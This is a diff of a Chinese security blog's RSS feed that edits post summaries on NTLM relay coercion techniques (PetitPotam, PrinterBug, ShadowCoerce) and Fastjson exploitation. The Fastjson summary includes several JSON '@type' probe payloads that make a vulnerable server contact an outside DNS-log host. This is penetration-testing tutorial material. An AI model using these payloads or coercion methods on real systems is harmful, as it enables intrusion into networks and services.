@@ -10,10 +10,12 @@
     <pubDate>Fri, 18 Feb 2022 17:10:15 &#43;0800</pubDate>
     <author>作者</author>
     <guid>https://songzhiv.github.io/ntlm-relay/</guid>
-    <description><![CDATA[本篇主要围绕下图进行。来自
+    <description><![CDATA[本文主要讲Relay的一些路径，并不会讲太多原理性的东西，如果你对NTLM Relay不太了解。那么强烈建议阅读下面两篇世纪好文：
+NTLM 篇 - windows protocol
+NTLM Relay - hackndo
+本篇主要围绕下图进行。来自
 https://www.thehacker.recipes/ad/movement/ntlm/relayNTLM relay.drawio.png
 " https://www.thehacker.recipes/ad/movement/ntlm/relay 
-原理直接看国外老哥写的这篇文章NTLM RELAY。本文主要讲Relay的一些路径。
 触发NTLM认证。 SMB PetitPotam（MS-EFSR） https://github.com/topotam/PetitPotam
  MS-EFSR 是 Microsoft 的加密文件系统远程协议。它对远程存储并通过网络访问的加密数据执行维护和管理操作，并可作为 RPC 接口使用。该接口可通过 \pipe\efsrpc、\pipe\lsarpc、\pipe\samr、\pipe\lsass 和 \pipe\netlogon SMB 命名管道使用。
 MS-efs触发机器账户强制返回身份验证。默认走SMB协议。
@@ -22,10 +24,7 @@ PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printe
  Microsoft 的 Print Spooler 是一项处理打印作业和其他与打印相关的各种任务的服务。控制域用户/计算机的攻击者可以通过特定的 RPC 调用触发运行它的目标的假脱机服务，并使其对攻击者选择的目标进行身份验证。此缺陷是“无法修复”，默认情况下在所有 Windows 环境中启用。
 强制身份验证通过 SMB 进行。
 上面提到的“具体调用”就是 RpcRemoteFindFirstPrinterChangeNotificationEx 通知方法，它是 MS-RPRN 协议的一部分。 MS-RPRN 是 Microsoft 的打印系统远程协议。它定义了打印客户端和打印服务器之间的打印作业处理和打印系统管理的通信。
- ShadowCoerce (MS-FSRVP)  MS-FSRVP 是 Microsoft 的文件服务器远程 VSS 协议。它用于在远程计算机上创建文件共享的卷影副本，并促进备份应用程序在 SMB2 共享 上执行应用程序一致的备份和数据恢复。
-滥用的一个要求是在目标服务器上启用“文件服务器 VSS 代理服务”。
- https://github.com/ShutdownRepo/ShadowCoerce
-1  python3 shadowcoerce.]]></description>
+ ShadowCoerce (MS-FSRVP)  MS-FSRVP 是 Microsoft 的文件服务器远程 VSS 协议。它用于在远程计算机上创建文件共享的卷影副本，并促进备份应用程序在 SMB2 共享 上执行应用程序一致的备份和数据恢复。]]></description>
 </item><item>
     <title>Fastjson利用总结</title>
     <link>https://songzhiv.github.io/fastjson/</link>
@@ -35,7 +34,7 @@ PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printe
     <description><![CDATA[0X01 漏洞利用 探测fastjson 对于有错误回显的情况
 使用{&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;或者 &quot;{&quot;a&quot;:x&quot;通过异常直接回显出版本号，接下来就直接根据版本号判断有没有漏洞和找exp了
 无回显使用dnslog探测POC：
-1 2 3 4 5 6  1. {&#34;@type&#34;:&#34;java.net.InetSocketAddress&#34;{&#34;address&#34;:,&#34;val&#34;:&#34;sq20yi.ceye.io&#34;}} 2. {&#34;@type&#34;:&#34;java.net.Inet4Address&#34;,&#34;val&#34;:&#34;sq20yi.ceye.io&#34;} 3. {&#34;@type&#34;:&#34;java.net.Inet6Address&#34;,&#34;val&#34;:&#34;sq20yi.ceye.io&#34;} 4. {&#34;@type&#34;:&#34;com.alibaba.fastjson.JSONObject&#34;, {&#34;@type&#34;: &#34;java.net.URL&#34;, &#34;val&#34;:&#34;http://sq20yi.ceye.io&#34;}}&#34;&#34;} 5. Set[{&#34;@type&#34;:&#34;java.net.URL&#34;,&#34;val&#34;:&#34;http://sq20yi.ceye.io&#34;}] 6. {&#34;@type&#34;:&#34;java.net.URL&#34;,&#34;val&#34;:&#34;http://sq20yi.ceye.io&#34;}:0   抓包修改请求体
+1 2 3 4 5  1. {&#34;@type&#34;:&#34;java.net.InetSocketAddress&#34;{&#34;address&#34;:,&#34;val&#34;:&#34;sq20yi.ceye.io&#34;}} 2. {&#34;@type&#34;:&#34;java.net.Inet4Address&#34;,&#34;val&#34;:&#34;sq20yi.ceye.io&#34;} 3. {&#34;@type&#34;:&#34;java.net.Inet6Address&#34;,&#34;val&#34;:&#34;sq20yi.ceye.io&#34;} 4. {&#34;@type&#34;:&#34;com.alibaba.fastjson.JSONObject&#34;, {&#34;@type&#34;: &#34;java.net.URL&#34;, &#34;val&#34;:&#34;http://sq20yi.ceye.io&#34;}}&#34;&#34;} 5. Set[{&#34;@type&#34;:&#34;java.net.URL&#34;,&#34;val&#34;:&#34;http://sq20yi.ceye.io&#34;}]   抓包修改请求体
 ==dnslog==收到请求信息就代表使用了==fastjson==来解析的json数据
 验证是否存在漏洞 fastjson1.2.47以后的版本利用 条件都比较苛刻，所以我们一般都会采用经典的1.2.47的POC，
 无限制RCE，通杀≤1.2.47的所有版本。47版本poc如下
